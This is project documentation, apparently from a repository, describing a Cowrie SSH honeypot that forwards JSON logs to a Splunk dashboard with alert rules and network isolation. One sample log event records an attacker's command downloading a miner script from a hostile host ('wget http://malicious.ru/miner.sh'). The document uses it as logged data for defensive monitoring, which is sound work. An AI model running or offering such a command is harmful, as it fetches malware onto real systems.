# 04 · Key Features

## 1. Realistic SSH Deception

Cowrie presents an authentic-looking SSH environment that keeps attackers engaged long enough to capture meaningful intelligence.

- **Fake hostname:** Configured as `prod-webserver-01` — looks like a real production server
- **Real-looking banner:** Standard OpenSSH banner fingerprint
- **Delayed credential acceptance:** Rejects logins several times before accepting, mimicking real brute-force resistance
- **Fake filesystem:** `/etc/passwd`, common binaries, and home directories all respond plausibly
- **Command emulation:** `ls`, `cat`, `wget`, `curl`, `uname`, `id` — all return fake but realistic output

---

## 2. Structured JSON Logging

Every attacker action is captured as a structured JSON event — making the data immediately queryable in Splunk without custom parsing.

Example login failure event:
```json
{
  "eventid": "cowrie.login.failed",
  "timestamp": "2024-11-14T03:22:11.482Z",
  "src_ip": "185.220.101.47",
  "src_port": 52814,
  "username": "root",
  "password": "admin123",
  "session": "a4f2b1c3"
}
```

Example command input event:
```json
{
  "eventid": "cowrie.command.input",
  "timestamp": "2024-11-14T03:24:05.103Z",
  "src_ip": "185.220.101.47",
  "session": "a4f2b1c3",
  "input": "wget http://malicious.ru/miner.sh"
}
```

---

## 3. Real-Time Log Pipeline

Logs flow from Cowrie to Splunk in near-real-time (typically under 5 seconds end-to-end):

```
cowrie.json written  →  UF detects new lines  →  TCP/9997  →  Splunk indexed  →  Searchable
        0s                      ~1s                  ~1s            ~2s              ~5s
```

The Universal Forwarder uses inotify-based file monitoring — no polling delay.

---

## 4. Live Attack Dashboard (6 Panels)

The Splunk dashboard provides a full operational picture of ongoing attacks:

| Panel | Type | What it shows |
|---|---|---|
| Attack volume over time | Timechart | Events per hour, split by event type |
| Attacker origin map | Cluster Map | GeoIP plotted world map of source IPs |
| Top attacking IPs | Bar chart | Ranked IPs by connection/attempt count |
| Most-tried credentials | Table | Top 20 username + password combinations |
| Commands run by attackers | Table | Most frequent shell commands attempted |
| Active sessions | Single value | Real-time open session count |

Dashboard auto-refreshes every 60 seconds.

---

## 5. Automated Alert Rules

Four scheduled alert rules cover the most critical detection scenarios:

### Alert 1 — Brute-Force Spike
Triggers when a single IP exceeds 50 login attempts in a 5-minute window.

### Alert 2 — Successful Login
Triggers immediately on any `cowrie.login.success` event. A successful login means an attacker has shell access inside Cowrie — highest priority.

### Alert 3 — New Country Source
Triggers when login attempts originate from a country not seen in the previous 7 days. Useful for detecting new scanning campaigns.

### Alert 4 — Command Execution Burst
Triggers when more than 10 commands are run in a single session. Indicates an attacker who made it past authentication and is actively exploring.

---

## 6. GeoIP Enrichment

Splunk's built-in `iplocation` command resolves attacker IPs to:
- Country and city
- Latitude/longitude (for map visualisation)
- ISP/ASN information

This runs at search time — no external API calls required, and no outbound traffic from the honeypot VM.

---

## 7. Network Isolation

The honeypot is hardened to prevent it being used as an attack platform:

- **UFW outbound deny-all** except `SPLUNK_IP:9997`
- **No real shell** exposed on standard port 22 (management uses port 2244)
- **Cowrie runs as unprivileged user** — no sudo, no root
- **Virtualenv isolation** — Cowrie's Python environment is completely separate from system Python
- **iptables NAT** handles port redirection without running Cowrie as root
